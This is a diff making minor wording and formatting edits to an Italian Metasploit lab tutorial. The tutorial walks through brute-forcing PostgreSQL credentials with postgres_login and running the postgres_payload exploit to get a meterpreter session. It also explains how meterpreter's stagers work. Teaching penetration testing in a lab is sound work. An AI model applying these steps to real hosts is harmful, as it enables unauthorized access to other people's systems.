@@ -88,7 +88,7 @@ Matching Modules
    17  auxiliary/admin/http/rails_devise_pass_reset                2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
 ```
 
-Come si nota, la entry numero 13 prevede l'esecuzione di un payload su un'istanza postgres su linux il cui rank è classificato come excellent. Andiamo ad approfondire con il comando info.
+Vediamo che la entry numero 13 prevede l'esecuzione di un payload su un'istanza postgres su linux il cui rank è classificato come excellent. Andiamo ad approfondire con il comando info.
 
 ```
 msf6 > info 13
@@ -157,10 +157,10 @@ Module options (exploit/linux/postgres/postgres_payload):
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    DATABASE  template1        yes       The database to authenticate against
-   PASSWORD  		          no        The password for the specified username. Leave blank for a random password.
+   PASSWORD  		            no        The password for the specified username. Leave blank for a random password.
    RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
    RPORT     5432             yes       The target port
-   USERNAME  		          yes       The username to authenticate as
+   USERNAME  		            yes       The username to authenticate as
    VERBOSE   false            no        Enable verbose output
 
 
@@ -181,7 +181,7 @@ Exploit target:
 
 Vediamo che tra le opzioni configurabili ci sono anche username e password, che teoricamente non conosciamo. Vediamo però dalla ricerca precedente che è presente un modulo ausiliario denominato `postgres_login`, e ci permette con un attacco a semi-forza bruta di cercare automaticamente delle credenziali di login. Vediamo quindi i risultati dell'esecuzione:
 
-<img src="../imgs/postgres_login.png" width="600"> </br>
+<img src="../imgs/postgres_login.png" width="800"> </br>
 
 Abbiamo quindi trovato una coppia user/password funzionante, torniamo all'exploit e settiamo le opzioni.
 
@@ -198,11 +198,11 @@ LHOST => 192.168.56.101
 
 Lanciamo l'exploit e come vediamo dalla figura otteniamo una sessione di meterpreter, siamo quindi entrati in controllo della macchina target!
 
-<img src="../imgs/postgres_exploit.png" width="600"> </br>
+<img src="../imgs/postgres_exploit.png" width="800"> </br>
 
 ## Meterpreter
 
-Facciamo quindi una piccola digressione teorica su meterpreter, questo tool fornito sempre dagli sviluppatori di Rapid7, è un payload estensibile dinamicamente tramite injection in memoria di moduli detti stagers. L'estensione più essere comandata tramite messaggi dalla macchina remota via rete.
+Facciamo ora una piccola digressione teorica su meterpreter, questo tool fornito sempre dagli sviluppatori di Rapid7, è un payload estensibile dinamicamente tramite injection in memoria di moduli detti stagers. L'estensione più essere comandata tramite messaggi dalla macchina remota via rete.
 Nel dettaglio, meterpreter si avvia a stadi:
 - Il target esegue il primo stager, di solito uno tra i moduli bind e reverse.
 - Lo stager carica la DLL chiamata Reflexive in memoria. 
